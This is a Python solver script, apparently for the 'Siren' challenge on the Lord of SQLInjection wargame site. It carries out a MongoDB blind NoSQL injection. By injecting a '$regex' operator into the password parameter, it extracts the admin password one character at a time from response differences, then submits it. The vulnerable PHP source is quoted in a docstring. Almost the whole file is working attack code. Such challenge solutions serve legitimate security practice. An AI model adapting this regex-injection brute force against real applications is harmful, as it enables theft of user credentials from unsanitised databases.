#!/usr/bin/env python3
import los
import los_cookies as lc


def check_func(*args) -> bool:
    """
    check string in response of request
    args[0]: response
    """
    return 'Hello User' in args[0]


def find_pw(pw, p):
    for i in range(48, 123):
        if chr(i) == '?' or chr(i) == '^' or chr(i) == '|':
            continue
        p.payload = "^%s" % (pw + chr(i))
        response = p.my_request()
        print('')
        if check_func(response):
            return chr(i)


def main():
    """
    Siren 47 MongoDB Blind Injection

    $db = mongodb_connect();
    $query = array(
      "id" => $_GET['id'],
      "pw" => $_GET['pw']
    );
    echo "<hr>query : <strong>".json_encode($query)."</strong><hr><br>";
    $result = mongodb_fetch_array($db->prob_siren->find($query));
    if($result['id']) echo "<h2>Hello User</h2>";

    $query = array("id" => "admin");
    $result = mongodb_fetch_array($db->prob_siren->find($query));
    if($result['pw'] === $_GET['pw']) solve("siren");
    """

    url = "https://los.rubiya.kr/chall/siren_9e402fc1bc38574071d8369c2c3819ba.php"
    cook = lc.check_cookies(url)
    method = 'get'
    inj_param = 'pw[$regex]'
    other_param = {'id': 'admin'}

    result = ''
    p = los.SqlInjection(url, cook, method, inj_param, '', other_param=other_param)
    while True:
        try:
            result += find_pw(result, p)
            print('result', result)
        except:
            break

    p.payload = result
    p.inj_param = 'pw'
    response = p.my_request()
    if 'Clear!' in response:
        print('\nSiren Clear!')


if __name__ == '__main__':
    main()
